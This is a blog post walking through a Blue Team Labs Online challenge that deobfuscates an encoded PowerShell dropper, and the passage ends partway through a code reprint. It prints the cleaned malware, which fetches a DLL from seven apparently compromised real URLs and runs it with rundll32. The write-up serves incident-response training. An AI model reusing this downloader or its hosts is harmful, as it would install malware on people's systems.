<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="(BTLO/Challenge) - Malicious PowerShell Analysis" /><meta name="author" content="kill5witch" /><meta property="og:locale" content="en" /><meta name="description" content="Recently the networks of a large company named GothamLegend were compromised after an employee opened a phishing email containing malware. Scenario Recently the networks of a large company named GothamLegend were compromised after an employee opened a phishing email containing malware. The damage caused was critical and resulted in business-wide disruption. GothamLegend had to reach out to a third-party incident response team to assist with the investigation. You are a member of the IR team - all you have is an encoded Powershell script. Can you decode it and identify what malware is responsible for this attack?" /><meta property="og:description" content="Recently the networks of a large company named GothamLegend were compromised after an employee opened a phishing email containing malware. Scenario Recently the networks of a large company named GothamLegend were compromised after an employee opened a phishing email containing malware. The damage caused was critical and resulted in business-wide disruption. GothamLegend had to reach out to a third-party incident response team to assist with the investigation. You are a member of the IR team - all you have is an encoded Powershell script. Can you decode it and identify what malware is responsible for this attack?" /><link rel="canonical" href="https://an9k0r.github.io/posts/Malicious_PowerShell_Analysis/" /><meta property="og:url" content="https://an9k0r.github.io/posts/Malicious_PowerShell_Analysis/" /><meta property="og:site_name" content="CyberSec-Research.Space" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-05-19T18:33:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="(BTLO/Challenge) - Malicious PowerShell Analysis" /><meta name="twitter:site" content="@cybersec_space" /><meta name="twitter:creator" content="@kill5witch" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"kill5witch"},"description":"Recently the networks of a large company named GothamLegend were compromised after an employee opened a phishing email containing malware. Scenario Recently the networks of a large company named GothamLegend were compromised after an employee opened a phishing email containing malware. The damage caused was critical and resulted in business-wide disruption. GothamLegend had to reach out to a third-party incident response team to assist with the investigation. You are a member of the IR team - all you have is an encoded Powershell script. Can you decode it and identify what malware is responsible for this attack?","headline":"(BTLO/Challenge) - Malicious PowerShell Analysis","dateModified":"2022-05-25T12:09:30+02:00","url":"https://an9k0r.github.io/posts/Malicious_PowerShell_Analysis/","datePublished":"2022-05-19T18:33:00+02:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://an9k0r.github.io/posts/Malicious_PowerShell_Analysis/"},"@context":"https://schema.org"}</script><title>(BTLO/Challenge) - Malicious PowerShell Analysis | CyberSec-Research.Space</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="CyberSec-Research.Space"><meta name="application-name" content="CyberSec-Research.Space"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/images/logo.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">CyberSec-Research.Space</a></div><div class="site-subtitle font-italic">Information Security Personal Blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blogging/" class="nav-link"> <i class="fa-fw fas fa-book ml-xl-3 mr-xl-3 unloaded"></i> <span>BLOGS AND GUIDES</span> </a><li class="nav-item"> <a href="/hack_the_box/" class="nav-link"> <i class="fa-fw fas fa-bug ml-xl-3 mr-xl-3 unloaded"></i> <span>HACK THE BOX</span> </a><li class="nav-item"> <a href="/blue_team_ctf/" class="nav-link"> <i class="fa-fw fas fa-anchor ml-xl-3 mr-xl-3 unloaded"></i> <span>BLUE TEAM CTFS</span> </a><li class="nav-item"> <a href="/web_application/" class="nav-link"> <i class="fa-fw fas fa-terminal ml-xl-3 mr-xl-3 unloaded"></i> <span>WEB APPLICATION</span> </a><li class="nav-item"> <a href="/binary_exploitation/" class="nav-link"> <i class="fa-fw fas fa-microchip ml-xl-3 mr-xl-3 unloaded"></i> <span>BINARY EXPLOITATION</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/an9k0r" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/cybersec_space" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>(BTLO/Challenge) - Malicious PowerShell Analysis</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 694 515'%3E%3C/svg%3E" data-src="/assets/images/2022-05-20-15-59-22.png" class="preview-img bg" alt="image alternative text" width="694" height="515" data-proofer-ignore><h1 data-toc-skip>(BTLO/Challenge) - Malicious PowerShell Analysis</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/an9k0r">kill5witch</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2022-05-19 18:33:00 +0200" data-toggle="tooltip" data-placement="bottom" title="Thu, May 19, 2022, 6:33 PM +0200" >May 19, 2022</em> </span> <span> Updated <em class="timeago" date="2022-05-25 12:09:30 +0200 " data-toggle="tooltip" data-placement="bottom" title="Wed, May 25, 2022, 12:09 PM +0200" >May 25, 2022</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="860 words"> <em>4 min</em> read</span></div></div></div><div class="post-content"><p><strong>Recently the networks of a large company named GothamLegend were compromised after an employee opened a phishing email containing malware.</strong></p><h1 id="scenario">Scenario</h1><blockquote><p>Recently the networks of a large company named GothamLegend were compromised after an employee opened a phishing email containing malware. The damage caused was critical and resulted in business-wide disruption. GothamLegend had to reach out to a third-party incident response team to assist with the investigation. You are a member of the IR team - all you have is an encoded Powershell script. Can you decode it and identify what malware is responsible for this attack?</p></blockquote><h1 id="downloading-powershell-file">Downloading Powershell File</h1><p>For this challenge, we don’t actually get an access to a box, but just a simple powershell file that we have to download to disk. It’s a simple PS command and we have to investigate what it does.</p><p><img data-src="/assets/images/2022-05-19-19-39-44.png" alt="" data-proofer-ignore></p><h1 id="basic-base64-deobfuscation">Basic Base64 Deobfuscation</h1><p>Let’s copy and paste command into Cyberchef (https://gchq.github.io/CyberChef/) and set the filters “From Base64” and “Decode text” with “UTF-16LE”. Doing that we can actually see the command:</p><p><img data-src="/assets/images/2022-05-19-19-44-04.png" alt="" data-proofer-ignore></p><p>So we can see some code there, but it’s still pretty unreadable. Let’s throw <code class="language-plaintext highlighter-rouge">Generic Code Beautify</code> in there.</p><p><img data-src="/assets/images/2022-05-20-08-35-05.png" alt="" data-proofer-ignore></p><h1 id="analyzing-level-of-obfuscation">Analyzing level of obfuscation</h1><p>So we can see few techniques that were used for obfuscating this code.</p><h2 id="random-case">Random Case<a href="#random-case" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>It’s actualy all over.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>... sEt MKu ...
</pre></table></code></div></div><p>We could use <code class="language-plaintext highlighter-rouge">ToLowerCase</code> which might break the code but increase readability.</p><p><img data-src="/assets/images/2022-05-20-08-38-39.png" alt="" data-proofer-ignore></p><p>I will use this with caution and might disable it.</p><h2 id="backticks">Backticks<a href="#backticks" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Example:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>do`wnl`oad`file
</pre></table></code></div></div><p>Let’s use <code class="language-plaintext highlighter-rouge">Find/Replace</code> for this one.</p><p><img data-src="/assets/images/2022-05-20-08-41-22.png" alt="" data-proofer-ignore></p><p>So strings, especially longer ones, are getting more readable.</p><h2 id="discatenation">Discatenation<a href="#discatenation" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Example</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>adm' + 'int' + 'k.c' + 'o' + 'm/' + 'w'
</pre></table></code></div></div><p>Since there are more different patterns i’ve had a hard time to find a right balance which signs to take away in order to not to break the code to much. This is no fancy regex, but it has made the code a little bit more readable.</p><p><img data-src="/assets/images/2022-05-20-13-50-10.png" alt="" data-proofer-ignore></p><h2 id="reorder">Reorder<a href="#reorder" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>[type]("{0}{1}{2}{4}{3}" -f 'syst','em.','io.di','ory','rect')
</pre></table></code></div></div><p>As there are only two occurences i’ll reverse the strings using powershell and put the strings back into the code.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>PS C:\&gt; echo ("{0}{1}{2}{4}{3}" -f 'syst','em.','io.di','ory','rect') | out-string
system.io.directory

PS C:\&gt; echo ("{6}{8}{0}{3}{4}{5}{2}{7}{1}" -f'stem','ger','ma','.n','et.servicepoi','nt','s','na','y')
system.net.servicepointmanager
</pre></table></code></div></div><h1 id="manually-cleaning-the-rest-of-the-code">Manually “cleaning” the rest of the code.</h1><p>This is what i have now <img data-src="/assets/images/2022-05-20-13-57-30.png" alt="" data-proofer-ignore></p><p>I’ll clean few other spots</p><h1 id="ascii-character-conversions">Ascii character conversions</h1><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>[char]92
</pre></table></code></div></div><p>This ones can be simply put into powershell</p><p><img data-src="/assets/images/2022-05-20-14-31-53.png" alt="" data-proofer-ignore></p><p>After cleaning some parentshesis manually this is what i’ve ended up with</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="n">set</span><span class="w"> </span><span class="nx">mku</span><span class="p">([</span><span class="n">type</span><span class="p">](</span><span class="n">system.io.directory</span><span class="p">));</span><span class="w">
</span><span class="n">set-item</span><span class="p">(</span><span class="s1">'variable:mbu'</span><span class="p">)[</span><span class="n">type</span><span class="p">](</span><span class="n">system.net.servicepointmanager</span><span class="p">);</span><span class="w">
</span><span class="nv">$erroractionpreference</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">((</span><span class="s1">'silentlycontinue'</span><span class="p">));</span><span class="w">
</span><span class="nv">$cvmmq4o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$q26l</span><span class="w">  </span><span class="o">+</span><span class="w">  </span><span class="s2">"@"</span><span class="w">  </span><span class="o">+</span><span class="w">  </span><span class="nv">$e16h</span><span class="p">;</span><span class="w">
</span><span class="nv">$j16j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'n_0p'</span><span class="p">;</span><span class="w">
</span><span class="p">(</span><span class="n">dir</span><span class="w"> </span><span class="nx">variable:mku</span><span class="p">)</span><span class="o">.</span><span class="nf">value</span><span class="p">::</span><span class="s2">"createdirectory"</span><span class="p">(</span><span class="nv">$home</span><span class="w">  </span><span class="o">+</span><span class="w">  </span><span class="p">((</span><span class="s1">'{0}db_bh30{0}yf5be5g{0}'</span><span class="p">)</span><span class="w">  </span><span class="nt">-f</span><span class="w"> </span><span class="s2">"\"</span><span class="p">));</span><span class="w">
</span><span class="nv">$c39y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'u68s'</span><span class="p">;</span><span class="w">
</span><span class="p">(</span><span class="n">variable</span><span class="p">(</span><span class="s2">"mbu"</span><span class="p">)</span><span class="w"> </span><span class="nt">-valueon</span><span class="w"> </span><span class="p">)::</span><span class="s2">"securityprotocol"</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="s1">'tls12'</span><span class="p">));</span><span class="w">
</span><span class="nv">$f35i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'i4_b'</span><span class="p">;</span><span class="w">
</span><span class="nv">$swrp6tc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'a69s'</span><span class="p">;</span><span class="w">
</span><span class="nv">$x27h</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'c33o'</span><span class="p">;</span><span class="w">
</span><span class="nv">$imd1yck</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$home</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="s1">'uohdb_bh30uohyf5be5guoh'</span><span class="p">)</span><span class="o">.</span><span class="s2">"replace"</span><span class="p">(</span><span class="s1">'uoh'</span><span class="p">,</span><span class="w"> </span><span class="s2">"\"</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$swrp6tc</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'.dll'</span><span class="p">;</span><span class="w">
</span><span class="nv">$k47v</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'r49g'</span><span class="p">;</span><span class="w">
</span><span class="nv">$b9fhbyv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="s1">']anw[3s://admintk.com/wp-admin/l/@]anw[3s://mikegeerinck.com/c/yysa/@]anw[3://freelancerwebdesignerhyderabad.com/cgi-bin/s/@]anw[3://etdog.com/wp-content/nu/@]anw[3s://www.hintup.com.br/wp-content/de/@]anw[3://www.stmarouns.nsw.edu.au/paypal/b8g/@]anw[3://wm.mcdevelop.net/content/6f2gd/'</span><span class="p">)</span><span class="o">.</span><span class="s2">"replace"</span><span class="p">(</span><span class="s1">']anw[3'</span><span class="p">,</span><span class="w"> </span><span class="p">([</span><span class="n">array</span><span class="p">](</span><span class="s1">'sd'</span><span class="p">,</span><span class="w"> </span><span class="s1">'sw'</span><span class="p">),</span><span class="w"> </span><span class="s1">'http'</span><span class="p">,</span><span class="w"> </span><span class="s1">'3d'</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="s2">"split"</span><span class="p">(</span><span class="nv">$c83r</span><span class="w">  </span><span class="o">+</span><span class="w">  </span><span class="nv">$cvmmq4o</span><span class="w">  </span><span class="o">+</span><span class="w">  </span><span class="nv">$f10q</span><span class="p">);</span><span class="w">
</span><span class="nv">$q52m</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'p05k'</span><span class="p">;</span><span class="w">
</span><span class="kr">foreach</span><span class="w"> </span><span class="p">(</span><span class="nv">$bm5pw6z</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$b9fhbyv</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="kr">try</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="s1">'new-object'</span><span class="p">)</span><span class="w"> </span><span class="n">system.net.webclient</span><span class="p">)</span><span class="o">.</span><span class="s2">"downloadfile"</span><span class="p">(</span><span class="nv">$bm5pw6z</span><span class="p">,</span><span class="w"> </span><span class="nv">$imd1yck</span><span class="p">);</span><span class="w">
        </span><span class="nv">$z10l</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="s1">'a92q'</span><span class="p">);</span><span class="w">
        </span><span class="kr">if</span><span class="w"> </span><span class="p">((</span><span class="o">&amp;</span><span class="p">(</span><span class="s1">'get-item'</span><span class="p">)</span><span class="w"> </span><span class="nv">$imd1yck</span><span class="p">)</span><span class="o">.</span><span class="s2">"length"</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">ge</span><span class="w"> </span><span class="nx">35698</span><span class="p">)</span><span class="w">  </span><span class="p">{</span><span class="w">
            </span><span class="o">&amp;</span><span class="p">(</span><span class="s1">'rundll32'</span><span class="p">)</span><span class="w"> </span><span class="nv">$imd1yck</span><span class="p">,</span><span class="w"> </span><span class="p">((</span><span class="s1">'control_rundll'</span><span class="p">)</span><span class="o">.</span><span class="s2">"tostring"</span><span class="p">();</span><span class="w">
            </span><span class="nv">$r65i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="s1">'z09b'</span><span class="p">));</span><span class="w">
            </span><span class="kr">break</span><span class="p">;</span><span class="w">
            </span><span class="nv">$k7_h</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="s1">'f12u'</span><span class="p">)</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w"> </span><span class="kr">catch</span><span class="w"> </span><span class="p">{}</span><span class="w">

</span><span class="p">}</span><span class="w">
</span><span class="nv">$w54i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'v95o'</span><span class="w">
</span></pre></table></code></div></div><h2 id="replacing-the-replace-function-manually">Replacing the Replace function manually<a href="#replacing-the-replace-function-manually" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Now let’s replace the Replace function Here</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$imd1yck</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$home</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="s1">'uohdb_bh30uohyf5be5guoh'</span><span class="p">)</span><span class="o">.</span><span class="s2">"replace"</span><span class="p">(</span><span class="s1">'uoh'</span><span class="p">,</span><span class="w"> </span><span class="s2">"\"</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$swrp6tc</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'.dll'</span><span class="p">;</span><span class="w">
</span></pre></table></code></div></div><p>Which becomes</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$imd1yck = $home + '\db_bh30\yf5be5g\' + $swrp6tc + '.dll'
</pre></table></code></div></div><p>And second string:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">(</span><span class="s1">']anw[3s://admintk.com/wp-admin/l/@]anw[3s://mikegeerinck.com/c/yysa/@]anw[3://freelancerwebdesignerhyderabad.com/cgi-bin/s/@]anw[3://etdog.com/wp-content/nu/@]anw[3s://www.hintup.com.br/wp-content/de/@]anw[3://www.stmarouns.nsw.edu.au/paypal/b8g/@]anw[3://wm.mcdevelop.net/content/6f2gd/'</span><span class="p">)</span><span class="o">.</span><span class="s2">"replace"</span><span class="p">(</span><span class="s1">']anw[3'</span><span class="p">,</span><span class="w"> </span><span class="p">([</span><span class="n">array</span><span class="p">](</span><span class="s1">'sd'</span><span class="p">,</span><span class="w"> </span><span class="s1">'sw'</span><span class="p">),</span><span class="w"> </span><span class="s1">'http'</span><span class="p">,</span><span class="w"> </span><span class="s1">'3d'</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="s2">"split"</span><span class="p">(</span><span class="nv">$c83r</span><span class="w">  </span><span class="o">+</span><span class="w">  </span><span class="nv">$cvmmq4o</span><span class="w">  </span><span class="o">+</span><span class="w">  </span><span class="nv">$f10q</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><p>Gives as an array of URLs. First <code class="language-plaintext highlighter-rouge">]anw[3</code> gets replaces by <code class="language-plaintext highlighter-rouge">http</code> and then <code class="language-plaintext highlighter-rouge">split happens with</code> a <code class="language-plaintext highlighter-rouge">@</code> which is saved in <code class="language-plaintext highlighter-rouge">$cvmmq4o</code>.</p><p>We end up with simple array.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$b9fhbyv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'https://admintk.com/wp-admin/l/'</span><span class="p">,</span><span class="s1">'https://mikegeerinck.com/c/yysa/'</span><span class="p">,</span><span class="s1">'http://freelancerwebdesignerhyderabad.com/cgi-bin/s/'</span><span class="p">,</span><span class="s1">'http://etdog.com/wp-content/nu/'</span><span class="p">,</span><span class="s1">'https://www.hintup.com.br/wp-content/de/'</span><span class="p">,</span><span class="s1">'http://www.stmarouns.nsw.edu.au/paypal/b8g/'</span><span class="p">,</span><span class="s1">'http://wm.mcdevelop.net/content/6f2gd/'</span><span class="w">
</span></pre></table></code></div></div><p>Now our command looks like this</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="n">set</span><span class="w"> </span><span class="nx">mku</span><span class="p">([</span><span class="n">type</span><span class="p">](</span><span class="n">system.io.directory</span><span class="p">));</span><span class="w">
</span><span class="n">set-item</span><span class="p">(</span><span class="s1">'variable:mbu'</span><span class="p">)[</span><span class="n">type</span><span class="p">](</span><span class="n">system.net.servicepointmanager</span><span class="p">);</span><span class="w">
</span><span class="nv">$erroractionpreference</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'silentlycontinue'</span><span class="p">;</span><span class="w">
</span><span class="nv">$cvmmq4o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$q26l</span><span class="w">  </span><span class="o">+</span><span class="w">  </span><span class="s2">"@"</span><span class="w">  </span><span class="o">+</span><span class="w">  </span><span class="nv">$e16h</span><span class="p">;</span><span class="w">
